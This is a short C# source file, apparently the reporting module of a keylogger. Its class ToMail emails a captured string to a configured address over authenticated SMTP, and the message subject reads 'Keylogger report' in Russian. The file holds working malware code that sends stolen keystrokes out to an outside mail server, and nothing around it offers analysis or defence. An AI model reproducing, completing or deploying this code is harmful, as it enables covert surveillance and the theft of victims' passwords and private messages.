using System.Net;
using System.Net.Mail;

namespace Logger
{
    public class ToMail : Sender
    {
        MailInfo Info;
        public ToMail(MailInfo info)
        {
            Info = info;
        }
        public override bool Send(string s)
        {
            try
            {
                MailMessage msg = new MailMessage(Info.From, Info.To, "Отчёт кейлогера", s);
                SmtpClient smtpClient = new SmtpClient(Info.Smtp, Info.Port);
                smtpClient.EnableSsl = true;
                smtpClient.UseDefaultCredentials = false;
                smtpClient.Credentials = new NetworkCredential(Info.From, Info.Pass);
                smtpClient.Timeout = 90000;
                smtpClient.Send(msg);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
